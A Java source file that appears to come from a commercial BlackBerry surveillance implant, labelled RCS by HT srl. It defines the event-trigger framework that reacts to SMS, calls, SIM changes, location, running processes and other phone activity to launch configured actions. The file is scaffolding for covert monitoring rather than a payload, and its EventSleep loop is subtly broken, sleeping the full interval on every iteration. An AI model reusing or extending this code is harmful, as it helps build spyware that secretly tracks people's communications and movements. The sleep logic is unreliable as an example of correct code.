/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Event.java
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.event;

import com.ht.rcs.blackberry.Status;
import com.ht.rcs.blackberry.action.Action;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;
import com.ht.rcs.blackberry.utils.Utils;


// TODO: Auto-generated Javadoc
/**
 * The Class Event.
 */
public abstract class Event extends Thread {
    
    /** The debug. */
    private static Debug debug = new Debug("Event", DebugLevel.VERBOSE);

    /** The Constant EVENT. */
    public static final int EVENT = 0x2000;
    
    /** The Constant EVENT_TIMER. */
    public static final int EVENT_TIMER = EVENT + 0x1;
    
    /** The Constant EVENT_SMS. */
    public static final int EVENT_SMS = EVENT + 0x2;
    
    /** The Constant EVENT_CALL. */
    public static final int EVENT_CALL = EVENT + 0x3;
    
    /** The Constant EVENT_CONNECTION. */
    public static final int EVENT_CONNECTION = EVENT + 0x4;
    
    /** The Constant EVENT_PROCESS. */
    public static final int EVENT_PROCESS = EVENT + 0x5;
    
    /** The Constant EVENT_CELLID. */
    public static final int EVENT_CELLID = EVENT + 0x6;
    
    /** The Constant EVENT_QUOTA. */
    public static final int EVENT_QUOTA = EVENT + 0x7;
    
    /** The Constant EVENT_SIM_CHANGE. */
    public static final int EVENT_SIM_CHANGE = EVENT + 0x8;
    
    /** The Constant EVENT_LOCATION. */
    public static final int EVENT_LOCATION = EVENT + 0x9;
    
    /** The Constant EVENT_AC. */
    public static final int EVENT_AC = EVENT + 0xa;
    
    /** The Constant EVENT_BATTERY. */
    public static final int EVENT_BATTERY = EVENT + 0xb;

    /** The Event type. */
    public int EventType = -1;
    
    /** The Event id. */
    public int EventId = -1;

    /** The Action id. */
    public int ActionId = Action.ACTION_UNINIT; // valido, ACTION_NONE, non si
                                                // rompe.

    /** The status obj. */
                                                protected Status statusObj = null;

    /** The Need to stop. */
    boolean NeedToStop = false;
    
    /** The Running. */
    boolean Running = false;

    /**
     * Factory.
     * 
     * @param EventId the event id
     * @param EventType the event type
     * @param ActionId the action id
     * @param confParams the conf params
     * @return the event
     */
    public static Event Factory(int EventId, int EventType, int ActionId,
            byte[] confParams) {
        Event event = null;

        switch (EventType) {
            case EVENT_TIMER:
                debug.trace("Factory EVENT_TIMER");
                event = new TimerEvent(ActionId, confParams);
                break;
            case EVENT_SMS:
                debug.trace("Factory EVENT_SMS");
                event = new SmsEvent(ActionId, confParams);
                break;
            case EVENT_CALL:
                debug.trace("Factory EVENT_CALL");
                event = new CallEvent(ActionId, confParams);
                break;
            case EVENT_CONNECTION:
                debug.trace("Factory EVENT_CONNECTION");
                event = new ConnectionEvent(ActionId, confParams);
                break;
            case EVENT_PROCESS:
                debug.trace("Factory EVENT_PROCESS");
                event = new ProcessEvent(ActionId, confParams);
                break;
            case EVENT_CELLID:
                debug.trace("Factory EVENT_CELLID");
                event = new CellIdEvent(ActionId, confParams);
                break;
            case EVENT_QUOTA:
                debug.trace("Factory EVENT_QUOTA");
                event = new QuotaEvent(ActionId, confParams);
                break;
            case EVENT_SIM_CHANGE:
                debug.trace("Factory EVENT_SIM_CHANGE");
                event = new SimChangeEvent(ActionId, confParams);
                break;
            case EVENT_LOCATION:
                debug.trace("Factory EVENT_LOCATION");
                event = new LocationEvent(ActionId, confParams);
                break;
            case EVENT_AC:
                debug.trace("Factory EVENT_AC");
                event = new AcEvent(ActionId, confParams);
                break;
            case EVENT_BATTERY:
                debug.trace("Factory EVENT_BATTERY");
                event = new BatteryEvent(ActionId, confParams);
                break;
            default:
                debug.error("Factory Unknown type:" + EventType);
                return null;
        }

        // TODO: mettere dentro i costruttori
        event.EventId = EventId;
        return event;
    }

    /**
     * Instantiates a new event.
     * 
     * @param eventId the event id
     * @param actionId the action id
     */
    protected Event(int eventId, int actionId) {
        this.statusObj = Status.getInstance();

        this.EventType = eventId;
        this.ActionId = actionId;
    }

    /**
     * Instantiates a new event.
     * 
     * @param eventId the event id
     * @param actionId the action id
     * @param confParams the conf params
     */
    protected Event(int eventId, int actionId, byte[] confParams) {
        this(eventId, actionId);
        Parse(confParams);
    }

    /**
     * Parses the.
     * 
     * @param confParams the conf params
     * @return true, if successful
     */
    protected abstract boolean Parse(byte[] confParams);

    /**
     * Event run.
     */
    protected abstract void EventRun();

    /* (non-Javadoc)
     * @see java.lang.Thread#run()
     */
    public void run() {
        debug.info("Run");
        NeedToStop = false;
        Running = true;

        EventRun();

        Running = false;
        debug.info("End");
    }

    /**
     * Checks if is running.
     * 
     * @return true, if is running
     */
    public boolean isRunning() {
        return Running;
    }

    /**
     * Event sleep.
     * 
     * @param millisec the millisec
     * @return true, if successful
     */
    protected boolean EventSleep(int millisec) {
        int loops = 0;
        int sleepTime = 1000;

        if (millisec < sleepTime) {
            Utils.Sleep(millisec);

            if (NeedToStop) {
                NeedToStop = false;
                return true;
            }

            return false;
        } else {
            loops = millisec / sleepTime;
        }

        while (loops > 0) {
            Utils.Sleep(millisec);
            loops--;

            if (NeedToStop) {
                NeedToStop = false;
                return true;
            }
        }

        return false;
    }

    /**
     * Stop.
     */
    public void Stop() {
        debug.info("Stopping...");
        NeedToStop = true;
    }
}
